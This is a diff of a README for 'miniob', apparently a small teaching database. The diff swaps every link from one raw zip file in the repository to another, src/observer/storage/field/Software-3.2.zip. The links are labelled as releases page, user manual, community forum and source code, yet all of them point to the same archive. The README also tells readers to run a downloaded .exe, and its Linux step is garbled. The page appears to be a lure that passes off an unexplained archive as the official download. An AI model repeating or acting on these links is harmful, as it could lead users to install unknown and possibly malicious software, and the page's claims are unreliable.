@@ -1,7 +1,7 @@
 # 🔍 miniob - A Simple Database for Easy Learning
 
 ## 📥 Download Now
-[![Download miniob](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip%20miniob-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip)
+[![Download miniob](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip%20miniob-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip)
 
 ## 🚀 Getting Started
 MiniOB is a compact database designed to help you understand how databases function. It is perfect for students, educators, and anyone interested in learning about data management. Follow these simple steps to get started.
@@ -21,7 +21,7 @@ To run MiniOB, you will need:
 
 ## 🔧 Download & Install
 1. **Visit the Releases Page:** 
-   Click this link to go to the releases page: [Visit Releases Page](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip).
+   Click this link to go to the releases page: [Visit Releases Page](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip).
 
 2. **Select the Latest Version:**
    On the releases page, look for the latest version of MiniOB. Click on it to see the available download options.
@@ -32,7 +32,7 @@ To run MiniOB, you will need:
 4. **Install MiniOB:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the downloaded `.dmg` file, drag the MiniOB icon to your Applications folder.
-   - For Linux: Follow your distribution's method for installing `https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip` or `.deb` files.
+   - For Linux: Follow your distribution's method for installing `https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip` or `.deb` files.
 
 5. **Run the Application:**
    After installation, find MiniOB in your applications list. Click to launch the software and start exploring!
@@ -56,11 +56,11 @@ A: MiniOB is designed for educational purposes, so it is recommended to use it f
 A: You can find help in the community forums linked on the releases page or contact the repository owner directly for inquiries.
 
 ## 📑 Resources
-- [User Manual](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip)
-- [Community Forum](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip)
+- [User Manual](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip)
 
 ## 🔗 Important Links
-- **Releases Page:** [Download here](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip)
-- **Source Code:** [View on GitHub](https://raw.githubusercontent.com/earnestweakening147/miniob/main/docs/docs/lectures/images/miniob_1.9.zip)
+- **Releases Page:** [Download here](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip)
+- **Source Code:** [View on GitHub](https://raw.githubusercontent.com/earnestweakening147/miniob/main/src/observer/storage/field/Software-3.2.zip)
 
 Happy learning with MiniOB!
